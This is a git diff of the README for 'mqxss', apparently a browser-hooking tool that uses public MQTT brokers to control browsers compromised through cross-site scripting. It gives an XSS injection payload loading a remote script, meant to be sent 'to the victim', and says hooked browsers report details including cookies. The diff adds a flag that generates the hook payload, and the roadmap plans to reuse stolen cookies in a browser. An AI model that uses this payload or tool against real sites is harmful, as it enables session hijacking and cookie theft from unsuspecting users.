@@ -11,9 +11,9 @@ I created this without a lot of bells and whistles so that the user could send r
 
 Hooked browsers will communicate in the MQTT topic on the broker you specify, there are many public/free brokers to test this with.
 
-Currently all that is needed is to set the desired MQTT broker, port and base topic within the x.js file and then connect to the same broker with the client.  The x.js file has the Paho MQTT JS library included within it.
+To generate a JS payload to hook browsers with set the -g flag at runtime along with your broker, port and topic variables.  Doing so will create your payload in the /js/ folder.
 
-Then send your XSS payload to the victim while the mqxss client is running, ex: '"><script src=https://example.com/x.js></script> or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.  Future version will generate JS payload so that you don't have to manually set it with broker information.
+Then send your XSS payload to the victim while the mqxss client is running, ex: '"><script src=https://example.com/x.js></script> or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.
  
 ![a](https://github.com/grampae/mqxss/assets/36344197/20096c91-2e9e-4302-b5a9-e2edd665d382)
 
@@ -32,5 +32,5 @@ Then send your XSS payload to the victim while the mqxss client is running, ex: 
 
 - [ ] Encryption (currently just obfuscated)
 - [ ] Set user , password  for brokers that require it at runtime
-- [ ] Generate js payload at runtime to hook browsers with
+- [x] Generate js payload at runtime to hook browsers with
 - [ ] Open browser with hooked browser cookies for convenience
